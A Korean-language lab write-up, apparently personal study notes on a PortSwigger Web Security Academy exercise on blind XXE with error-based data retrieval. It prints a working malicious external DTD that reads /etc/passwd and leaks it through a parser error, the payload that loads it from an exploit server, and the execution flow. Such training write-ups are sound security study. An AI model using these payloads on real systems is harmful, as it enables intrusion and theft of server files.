# Lab: Exploiting blind XXE to retrieve data via error messages

## 개요

- **난이도**: Practitioner
- **주제**: Blind XXE — 에러 기반 데이터 탈취 / 외부 DTD + 파라미터 엔티티 / 존재하지 않는 경로로 에러 유발
- **링크**: https://portswigger.net/web-security/xxe/blind/lab-xxe-with-data-retrieval-via-error-messages

## 목표

OOB 외부 요청 없이, 파라미터 엔티티가 읽어온 파일 내용을 존재하지 않는 경로에 삽입해 XML 파서 에러를 유발한다. 에러 메시지에 파일 내용이 포함되어 응답 본문에서 직접 확인할 수 있다.

## 005 랩과의 차이

```
[005 랩 — OOB HTTP 탈취]
  파일 내용 → URL 파라미터 → 외부 서버 HTTP 요청
  → 네트워크 아웃바운드 필요
  → Burp Collaborator 로 수신

[006 랩 (이번) — 에러 기반 탈취]
  파일 내용 → 존재하지 않는 경로로 사용
  → XML 파서 에러 발생
  → 에러 메시지에 경로(파일 내용) 포함
  → 응답 본문에서 직접 확인
  → 아웃바운드 네트워크 불필요
```

## 에러 기반 탈취 원리

### 핵심 아이디어

```
XML 파서가 존재하지 않는 파일을 로딩할 때:
  SYSTEM "file:///nonexistent/경로"
  → 파서: 해당 경로 파일 없음
  → 에러 메시지: "file not found: /nonexistent/경로"
  → 에러 메시지에 경로가 포함됨

활용:
  경로에 파일 내용을 삽입:
  SYSTEM "file:///nonexistent/%file;"
  → %file; = /etc/passwd 내용
  → 에러: "file not found: /nonexistent/root:x:0:0:root:..."
  → 에러 메시지에서 파일 내용 확인!
```

### 일반 엔티티가 아닌 파라미터 엔티티를 사용하는 이유

```
사용자 언급: "일반 엔티티와 본문 호출이 안되는 문제"

일반 엔티티 시도:
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
  <productId>&xxe;</productId>
  → 서버가 XML 본문의 &xxe; 참조 차단
  → 또는 에러 메시지에 productId 값 미반영
  → 실패

파라미터 엔티티 + 외부 DTD:
  외부 DTD 내부에서 %file; 로 파일 읽기
  %error; 로 에러 유발
  → DTD 파싱 단계에서 처리 → 본문 차단 우회
  → 에러가 HTTP 응답에 포함 → 성공
```

## 공격 방법

### 외부 DTD 파일 (exploit 서버에 호스팅)

```xml
<!-- http://exploit-server.net/evil.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

### DTD 각 라인 분석

```
<!ENTITY % file SYSTEM "file:///etc/passwd">
  → %file; = /etc/passwd 파일 내용

<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  → %eval; 을 평가하면 아래가 DTD 에 선언됨:
    <!ENTITY % error SYSTEM 'file:///nonexistent/<파일내용>'>
  → &#x25; → % (005 랩과 동일한 이유: DTD 문자열 내 % 리터럴 표현)

%eval;
  → error 엔티티 선언 완성
  → SYSTEM 경로: 'file:///nonexistent/root:x:0:0:root:...'

%error;
  → 존재하지 않는 경로 로드 시도
  → 파서 에러: 해당 경로 없음
  → 에러 메시지에 경로 전체 포함
  → 응답 본문에 /etc/passwd 내용 노출!
```

### 타겟으로 보내는 XXE 페이로드

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://exploit-server.net/evil.dtd">
  %xxe;
]>
<stockCheck>
  <productId>1</productId>
  <storeId>1</storeId>
</stockCheck>
```

### 실행 흐름

```
1. 타겟 서버: DOCTYPE 파싱
   %xxe; → http://exploit-server.net/evil.dtd 로드

2. 외부 DTD 파싱:
   %file;  정의 → /etc/passwd 내용 준비
   %eval;  평가 → %error; 를 동적 선언
             (경로에 %file; = 파일 내용 삽입)
   %error; 평가 → file:///nonexistent/root:x:0:0:... 로드 시도

3. XML 파서 에러 발생:
   "java.io.FileNotFoundException:
    /nonexistent/root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    ..."

4. 에러가 HTTP 응답 본문에 포함:
   HTTP 400 / 500
   Body: "XML parsing error: /nonexistent/root:x:0:0:..."

5. 응답에서 /etc/passwd 내용 직접 확인!
   (OOB 없이 in-band 에러로 탈취)
```

## 005 vs 006 탈취 방법 비교

```
[005 — OOB HTTP 탈취]
  파일 내용 → URL 쿼리스트링 → 외부 HTTP 요청
  필요 조건: 타겟 서버가 아웃바운드 HTTP 가능
  확인 위치: Burp Collaborator 로그

[006 — 에러 기반 탈취 (이번)]
  파일 내용 → 잘못된 파일 경로 → XML 파서 에러
  필요 조건: 에러 메시지가 응답에 노출
  확인 위치: HTTP 응답 본문

상황별 선택:
  아웃바운드 HTTP 차단, 에러 노출 O → 006 방식
  에러 숨김, 아웃바운드 허용 → 005 방식
  둘 다 차단 → 심층 우회 기법 필요
```

## 003~006 랩 Blind XXE 기법 종합

| 랩 | 기법 | 아웃바운드 필요 | 에러 노출 필요 | 탈취 결과 |
|----|------|--------------|-------------|---------|
| 003 | 일반 엔티티 OOB | O | X | 탐지만 |
| 004 | 파라미터 엔티티 OOB | O | X | 탐지만 |
| 005 | 파라미터 체인 + 외부 DTD OOB | O | X | 파일 내용 탈취 |
| 006 | 파라미터 체인 + 외부 DTD 에러 | X | O | 파일 내용 탈취 |

## 핵심 정리

- 에러 기반 탈취는 파일 내용을 존재하지 않는 경로에 삽입해 XML 파서 에러를 유발하고, 에러 메시지에서 파일 내용을 읽는 방식이다.
- 아웃바운드 HTTP 가 차단된 환경에서도 에러 메시지가 응답에 노출되면 파일 탈취가 가능하다.
- 일반 엔티티(`&xxe;`)와 XML 본문 참조가 차단된 환경에서 파라미터 엔티티(`%xxe;`) + 외부 DTD 로 우회한다.
- `&#x25;` 로 DTD 문자열 내 `%` 리터럴 표현은 005 랩과 동일하게 적용된다.

## 배운 점 및 추가 학습

### 1. 에러 기반 정보 탈취의 일반 패턴

```
에러 메시지에 입력값이 포함되는 취약점 유형:

[SQL Error-based Injection]
  CONVERT(int, (SELECT table_name FROM ...))
  → 타입 변환 실패 에러에 값 포함

[XXE Error-based (이번)]
  SYSTEM 'file:///nonexistent/%file;'
  → 파일 없음 에러에 경로(파일 내용) 포함

[Template Injection Error-based]
  {{7/0}} → 0으로 나누기 에러에 표현식 결과 노출

공통 원리:
  파서/DB 가 에러 메시지에 처리 중이던 값을 포함
  → 입력값 → 에러 경로 → 에러 메시지 → 응답
```

### 2. 외부 DTD 없이 에러 기반 가능한가

```
내부 DTD 에서의 제약 (005 랩 참고):
  파라미터 엔티티를 다른 선언 내부에서 참조 불가
  → %eval; 선언 안에서 %file; 참조 불가
  → 외부 DTD 로 우회 필요

예외:
  일부 XML 파서가 내부 DTD 제약을 느슨하게 구현
  → 드문 경우이므로 외부 DTD 방식이 범용적
```

### 3. 001~006 XXE 공격 전체 흐름 요약

```
응답 반영 여부:
  반영 O → 001(파일), 002(SSRF)
  반영 X (Blind) → 003~006

Blind 탐지 방법:
  일반 엔티티 OOB → 003
  파라미터 엔티티 OOB → 004

Blind 데이터 탈취:
  아웃바운드 O → 005 (외부 HTTP)
  아웃바운드 X, 에러 노출 O → 006 (에러 기반)

차단 우회 누적:
  001: 기본 XXE
  003~004: 일반 엔티티 차단 → 파라미터 엔티티
  005~006: 내부 DTD 제약 → 외부 DTD
  006: 아웃바운드 차단 → 에러 채널
```
